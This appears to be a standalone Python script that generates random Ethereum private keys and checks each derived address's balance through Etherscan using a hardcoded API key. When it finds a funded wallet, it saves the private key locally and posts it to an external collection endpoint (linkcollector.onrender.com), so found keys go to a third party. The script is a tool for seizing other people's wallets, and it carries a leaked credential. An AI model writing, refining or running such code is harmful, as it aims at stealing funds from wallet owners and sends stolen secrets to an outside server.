
import hashlib
import random
import sys
import time
import requests
from colorama import Fore
from Crypto.Hash import keccak
import ecdsa

API_KEY = 'WXWU1HKNC5VTA3R2C2GSXSFA9X28G1I7M2'
ETHERSCAN_URL = 'https://api.etherscan.io/api'
FLASK_API_URL = "https://linkcollector.onrender.com/api/wallets"  # Adjust this URL as needed
MIN_BALANCE = 0.000000000001  # Minimum balance to stop the loop
SLEEP_TIME = 0.4  # Sleep time between requests

def keccak256(data):
    """Calculate the Keccak-256 hash."""
    k = keccak.new(digest_bits=256)
    k.update(data)
    return k.digest()

def generate_eth_address():
    """Generate a random Ethereum address and its corresponding private key."""
    # Generate a random 32-byte private key
    private_key = bytes(random.sample(range(0, 256), 32))
    # Generate public key from the private key
    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    public_key = signing_key.get_verifying_key().to_string()
    # Calculate Ethereum address from the public key
    eth_address = '0x' + keccak256(public_key)[-20:].hex()
    return private_key.hex(), eth_address

def check_balance(eth_address):
    """Check the balance of the given Ethereum address using the Etherscan API."""
    url = f'{ETHERSCAN_URL}?module=account&action=balance&address={eth_address}&tag=latest&apikey={API_KEY}'
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        if data['status'] == '1':
            return float(data['result']) / 10 ** 18  # Convert Wei to Ether
        elif data['message'] == 'NOTOK' and 'rate limit' in data['result']:
            print(Fore.YELLOW + "Rate limit exceeded. Sleeping for 60 seconds...")
            time.sleep(60)  # Sleep for 60 seconds if rate limit is hit
            return None
        else:
            print(Fore.RED + f"Error: {data['message']}")
            return None
    else:
        print(Fore.RED + "Error: Failed to retrieve data from Etherscan API")
        return None

def post_to_api(addr, priv, bal):
    """Post the Ethereum address, private key, and balance to the Flask API."""
    try:
        response = requests.post(FLASK_API_URL, json={
            "trx_address": addr,
            "private_key": priv,
            "balance": bal
        })
        if response.status_code == 201:
            print(Fore.GREEN + f"Posted to API successfully: {addr}{Fore.RESET}")
        else:
            print(Fore.RED + f"Failed to post to API: {response.status_code}{Fore.RESET}")
    except Exception as e:
        print(Fore.RED + f"Exception occurred while posting to API: {e}{Fore.RESET}")

def save_to_file(eth_address, private_key, balance):
    """Save the Ethereum address, private key, and balance to a file."""
    with open("data.txt", "w") as file:
        file.write(f"Address: {eth_address}\n")
        file.write(f"Private Key: {private_key}\n")
        file.write(f"Balance: {balance} ETH\n")

def main():
    """Main function to run the Ethereum address generation and balance checking."""
    scanned_count = 0  # Counter for scanned addresses
    while True:
        eth_private_key, eth_address = generate_eth_address()
        scanned_count += 1  # Increment the scanned count
        
        print(Fore.GREEN + f"Private Key: {eth_private_key}")
        print(Fore.WHITE + f"Address: {eth_address}")

        balance_ether = check_balance(eth_address)
        
        if balance_ether is not None:
            print(Fore.RED + f"Balance {eth_address}: {balance_ether} ETH")
            if balance_ether > MIN_BALANCE:
                save_to_file(eth_address, eth_private_key, balance_ether)
                post_to_api(eth_address, eth_private_key, balance_ether)  # Post to API
                print(Fore.GREEN + "Successful address found! Data saved.")
                print(Fore.BLUE + f"Total addresses scanned: {scanned_count}")
                sys.exit()
        
        # Print the scanned count every 100 addresses for better readability
        if scanned_count % 100 == 0:
            print(Fore.CYAN + f"Total addresses scanned: {scanned_count}")
        
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    main()
